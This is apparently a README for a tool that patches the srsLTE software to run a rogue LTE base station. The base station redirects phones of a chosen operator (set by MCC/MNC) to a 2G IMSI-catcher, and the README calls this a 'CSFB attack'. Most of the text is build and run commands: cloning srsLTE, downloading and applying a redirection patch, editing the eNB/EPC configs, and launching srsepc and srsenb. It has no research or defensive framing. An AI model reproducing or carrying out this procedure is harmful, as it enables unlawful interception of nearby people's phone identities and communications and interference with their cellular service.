# srslte_to_gsm
On ubuntu 20.04+
```bash
sudo apt-get install build-essential cmake libfftw3-dev libmbedtls-dev libboost-program-options-dev libconfig++-dev libsctp-dev
git clone https://github.com/srslte/srsLTE
cd srsLTE
wget https://raw.githubusercontent.com/bbaranoff/srslte_to_gsm/main/redirection_srslte_gsm.patch
patch -p1 < redirection_srslte_gsm.patch
mkdir build
cd build
cmake ..
make -j$(nproc)
sudo make install
sudo ldconfig
sudo  ./srsran_install_configs.sh user
sudo nano /root/.config/srsran/enb.conf
sudo nano /root/.config/srsran/epc.conf
```
Set mnc mcc as target
Set a 2G IMSI-Catcher on arfcn 871 with mnc mcc as target
1° Terminal
```
sudo srsepc
```
2° Terminal
```
sudo srsenb
```
Wait and you are done !

N.B.: Not always working !!
The UE has to had already been in GSM in active session so to make test switch to GSM then reswitch to LTE manually on the UE then you can try this CSFB attack.
